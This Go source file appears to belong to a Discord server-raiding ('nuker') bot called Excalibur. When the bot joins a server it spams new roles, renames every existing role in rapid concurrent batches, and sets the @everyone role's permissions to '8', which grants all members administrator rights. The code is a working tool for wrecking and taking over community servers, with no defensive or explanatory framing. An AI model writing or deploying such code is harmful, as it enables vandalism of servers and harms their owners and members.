package creating

import (
	"Excalibur/core/requests"
	"encoding/json"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func RolesSpam(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	dataMap := map[string]string{"name": string(ROLE_NAME), "type": "0"}
	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/roles", "POST", jsonData)
}

func DeleteRoles(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	roles, _ := s.GuildRoles(event.ID)

	smoothed := requests.Smooth(roles)

	dataMap := map[string]string{"name": string(ROLE_NAME), "type": "0"}
	jsonData, _ := json.Marshal(dataMap)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, role := range ch {
			go func(ch *discordgo.Role) {
				defer wg.Done()
				requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/roles/"+ch.ID, "PATCH", jsonData)
			}(role)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}

func EditRoles(s *discordgo.Session, event *discordgo.GuildCreate) {
	dataMap := map[string]string{"permissions": "8"}
	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/roles/"+event.ID, "PATCH", jsonData)
}
